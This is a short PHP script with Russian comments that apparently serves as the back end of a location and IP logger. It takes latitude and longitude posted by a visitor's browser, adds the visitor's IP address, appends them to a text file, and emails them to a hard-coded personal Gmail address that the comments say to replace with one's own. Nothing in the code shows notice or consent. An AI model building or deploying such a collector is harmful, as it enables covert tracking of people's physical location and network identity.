<?php
// Получаем данные о местоположении и IP-адресе из тела запроса
$requestBody = file_get_contents('php://input');
$data = json_decode($requestBody, true);
$latitude = $data['latitude'];
$longitude = $data['longitude'];
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Сохраняем местоположение и IP-адрес в файле
$filename = 'location_data.txt';
$dataToWrite = "Latitude: $latitude, Longitude: $longitude, IP Address: $ipAddress\n";
file_put_contents($filename, $dataToWrite, FILE_APPEND);

// Отправляем IP-адрес на ваш адрес электронной почты
$to = 'hikikomori4308@gmail.com'; // Замените на ваш адрес электронной почты
$subject = 'Новые данные о местоположении и IP-адресе пользователя';
$message = "Latitude: $latitude\nLongitude: $longitude\nIP Address: $ipAddress";
$headers = 'From: webserver@example.com'; // Замените на ваш адрес сервера

// Отправляем сообщение
mail($to, $subject, $message, $headers);

// Отправляем ответ клиенту
echo json_encode(['success' => true]);
?>
